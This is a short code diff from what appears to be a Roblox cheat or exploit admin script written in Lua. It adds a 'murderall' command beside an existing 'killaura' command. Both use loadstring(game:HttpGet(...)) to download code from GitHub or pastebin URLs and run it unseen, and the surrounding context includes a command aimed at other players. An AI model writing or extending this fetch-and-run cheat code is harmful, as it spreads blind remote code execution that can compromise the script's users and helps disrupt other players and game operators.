@@ -2369,6 +2369,9 @@ end
 	if command("killaura") or command("ka") then
     loadstring(game:HttpGet('https://pastebin.com/raw/ke5MR9Nh'))()
 	end
+	if command("murderall") then
+	loadstring(game:HttpGet"https://raw.githubusercontent.com/TheEliteFrom78-lua/Vulcanic/main/murderall", true)()
+	end
 	if command("dong") then
 		dong(arg2:lower())
 		notify(arg1:sub(2,2):upper()..arg1:sub(3).."ed "..arg2..".")
